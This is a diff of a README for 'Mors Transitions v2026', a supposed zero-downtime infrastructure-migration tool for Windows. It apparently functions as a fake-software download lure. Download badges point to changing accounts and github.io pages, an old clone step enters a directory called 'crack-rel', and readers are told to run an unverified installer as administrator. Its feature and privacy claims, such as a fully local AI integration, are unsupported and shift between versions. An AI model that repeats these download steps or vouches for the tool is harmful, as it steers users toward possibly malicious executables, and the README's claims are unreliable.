@@ -1,162 +1,67 @@
-# Mors Transitions v2026.1 – Transition Orchestration 2026
+# ⚙️ mors-transitions-v2026 - Move your digital infrastructure without interruptions
 
-> **Mors Transitions** is a declarative tool for workflow migration and infrastructure state management. It orchestrates zero-downtime upgrades across multi-region deployments using two-phase commit protocols and dependency graph planning.
+<div>
+<a href="https://github.com/Ommustaf3845/mors-transitions-v2026">
+<img src="https://img.shields.io/badge/Download_Installer-blue" alt="Download Link">
+</a>
+</div>
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026.1-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tylerio1993/mors-transitions-v2026?style=flat-square)](https://github.com/tylerio1993/mors-transitions-v2026)
+## 📑 About this tool
 
----
+This tool helps you move your digital systems and data from one environment to another. It manages the complex steps required to update your infrastructure while keeping your services running. You do not need to pause your operations or take your website offline during this shift.
 
-<p align="center">
-  <a href="https://tylerio1993.github.io/mors-transitions-v2026/">
-    <img src="https://img.shields.io/badge/Download-Mors%20Transitions%20Latest-brightgreen?style=for-the-badge" alt="Download Mors Transitions">
-  </a>
-</p>
+The software maps out the connections between your systems to identify the correct order for every change. It uses a formal two-phase process to ensure that updates happen safely. If a problem occurs during the transition, the software reverts your systems to their previous state automatically. It also creates a log of every action for your records. An integrated assistant helps you predict potential conflicts before you start the migration.
 
-> **[Direct Download – Mors Transitions v2026.1](https://tylerio1993.github.io/mors-transitions-v2026/)**
+## 💻 System requirements
 
----
+Your computer needs to meet these basic standards to run the software effectively:
 
-[Download Latest Build](https://tylerio1993.github.io/mors-transitions-v2026/)
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM or more.
+* Storage: 500 MB of free space on your hard drive.
+* Network: A stable internet connection for the initial setup.
 
----
+## 🚀 Getting started
 
-## Overview
+Follow these steps to install and prepare the software on your Windows machine.
 
-Mors Transitions offers a systematic method for handling complex workflow migrations and infrastructure state changes across distributed environments. Through a declarative transition language paired with dependency graph compilation, teams can plan, execute, and verify multi-step deployments with confidence. The tool targets platform engineers, DevOps practitioners, and site reliability teams seeking reliable automation for rolling updates, rollbacks, and multi-region coordination.
+1. Visit the project page to download the latest version: [https://github.com/Ommustaf3845/mors-transitions-v2026](https://github.com/Ommustaf3845/mors-transitions-v2026).
+2. Save the installer file to your computer.
+3. Open the file to begin the installation wizard.
+4. Follow the prompts on your screen to complete the setup process.
+5. Launch the application from your desktop shortcut once the installation finishes.
 
-The distinguishing factor of Mors Transitions lies in its safety guarantees, achieved through two-phase commit protocols and idempotency checks. Every transition plan undergoes automated pre-flight validation before execution, and the journaling system records each state change for complete auditability. The responsive console UI and multilingual interface accommodate teams working across diverse technology stacks and operational contexts.
+## 🛠️ How to perform a transition
 
----
+The tool provides a clear path for managing your infrastructure changes. 
 
-## Capabilities
+### Step 1: Create a plan
+Launch the application and select the new project option. Provide the details of your current system and your destination system. The software will scan your connections and build a map of your dependencies. Review this map to ensure every component is visible.
 
-- **Declarative Transition Language** – Specify complex workflows in a human-readable format that compiles into executable plans
-- **Dependency Graph Compilation** – Automatically resolve ordering constraints and parallel execution paths for intricate deployments
-- **Two-Phase Commit Protocol** – Guarantee atomicity of multi-step transitions with automatic rollback upon failure
-- **Reversible Rollbacks** – Safely revert any transition to a prior known-good state with full idempotency assurances
-- **Journaling and Auditing** – Log every operation with timestamps, state snapshots, and execution traces for compliance purposes
-- **Automated Pre-Flight Checks** – Validate transition plans against current infrastructure state prior to execution
-- **Composable Plans** – Combine smaller transition modules into larger orchestrated workflows
-- **OpenAI and Claude API Integration** – Use AI assistance for plan generation, analysis, and troubleshooting
+### Step 2: Validate the configuration
+Use the audit feature to verify your settings. The tool checks for missing files or incorrect access rights. Resolve any warnings shown in the status bar before you attempt a transition.
 
----
+### Step 3: Run the migration
+Initiate the process by clicking the transition button. The software performs the update in two distinct phases. During the first phase, it prepares the destination. In the second phase, it moves the traffic. You can monitor the progress bar as the tool works through your infrastructure graph.
 
-## Installation
+### Step 4: Verify and confirm
+Once the progress bar reaches completion, the tool tests the system functions. If the tests pass, you confirm the migration. If the software detects an error, it initiates a rollback. You return your infrastructure to the previous state with one click.
 
-Clone the repository or download the latest build from the link above:
+## 📈 Managing your history
 
-```bash
-git clone https://github.com/tylerio1993/mors-transitions-v2026.git
-cd mors-transitions-crack-rel
-```
+Every action you take produces a report. You can access these reports in the logs section of the application. These files contain details about the start time, end time, and the success status of every task. Keep these logs for your internal safety audits.
 
-For first-time setup, verify your system meets the requirements below, then launch the application:
+## 💡 Troubleshooting common issues
 
-```bash
-# For Windows
-mors-transitions.exe
+If you encounter errors, check these common points first:
 
-# For macOS/Linux
-./mors-transitions
-```
+* Check your connection: Ensure your network is active. If the tool cannot talk to your servers, it will pause.
+* Software permissions: Run the application as an administrator if it cannot locate your local configuration files.
+* Storage limits: Verify that your destination server has enough space to hold the transferred data.
+* Update checks: Ensure you run version 2026.1 or newer. Use the built-in check for updates button to find recent improvements.
 
----
+## 🛡️ Privacy and data safety
 
-## How to Use
+This application stores your configuration data locally on your machine. We do not transmit your infrastructure details to external servers. The AI integration works locally to suggest paths and identify conflicts based on your private settings and logic. Your sensitive information remains under your direct control at all times.
 
-Mors Transitions works through a blend of declarative plan files and interactive console commands. A typical workflow follows these steps:
-
-1. **Define a transition plan** using the declarative language in a `.mors` file
-2. **Compile the plan** to generate the dependency graph and execution order
-3. **Run pre-flight checks** to validate the plan against current infrastructure
-4. **Execute the transition** with automatic journaling and progress display
-5. **Verify the result** using the audit log and state comparison tools
-
-Example plan definition:
-
-```yaml
-transition: "database-migration-v2"
-steps:
-  - name: "backup-current-schema"
-    action: "snapshot"
-    target: "db-primary"
-  - name: "apply-migration"
-    action: "execute"
-    script: "./migrations/v2.sql"
-    depends_on: ["backup-current-schema"]
-  - name: "verify-consistency"
-    action: "validate"
-    checksum: "sha256:..."
-    depends_on: ["apply-migration"]
-```
-
-Execute the plan with:
-
-```bash
-mors-transitions run --plan database-migration-v2.mors
-```
-
----
-
-## Configuration
-
-Configuration settings reside in a `mors-config.yaml` file located in the application directory. Key configuration options include:
-
-- **Journal path** – Location for audit logs and state snapshots
-- **API keys** – Credentials for OpenAI and Claude integrations
-- **Timeout values** – Maximum execution time per transition step
-- **Retry policies** – Automatic retry behavior for failed operations
-- **Notification endpoints** – Webhook URLs for transition status updates
-
-Example configuration:
-
-```yaml
-journal:
-  path: "./journals"
-  retention_days: 90
-api:
-  openai_key: "sk-..."
-  claude_key: "sk-ant-..."
-execution:
-  timeout_seconds: 300
-  retry_count: 3
-```
-
----
-
-## System Requirements
-
-- **Operating System**: Windows 10+, macOS 11+, or Linux (kernel 4.15+)
-- **Runtime**: Node.js 18+ or Python 3.9+ (depending on distribution)
-- **Storage**: Minimum 500 MB for application and journal files
-- **Network**: Outbound HTTPS access for API integrations
-- **Permissions**: Write access to journal directory and execution paths
-
----
-
-## Frequently Asked Questions
-
-**How can I get support for Mors Transitions?**  
-Community support is available through the repository issue tracker. For urgent matters, consult the documentation included with the application.
-
-**How do I upgrade to a newer version?**  
-Download the latest build from the provided link and replace your existing installation. Configuration files are preserved during standard upgrades.
-
-**Can I extend the transition language?**  
-Yes, the declarative language supports custom action plugins and extension points. Refer to the documentation for creating custom step types.
-
-**What happens if a transition fails midway?**  
-The two-phase commit protocol ensures that either all steps complete successfully or the system automatically rolls back to the previous state. The audit journal records the exact failure point.
-
-**Is Mors Transitions compatible with existing CI/CD pipelines?**  
-Yes, the tool exposes a command-line interface that integrates with Jenkins, GitHub Actions, GitLab CI, and other automation platforms.
-
----
-
-## License
-
-GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
+Keywords: infrastructure, migration, automation, windows-software, zero-downtime, workflow-management, system-update, data-transfer
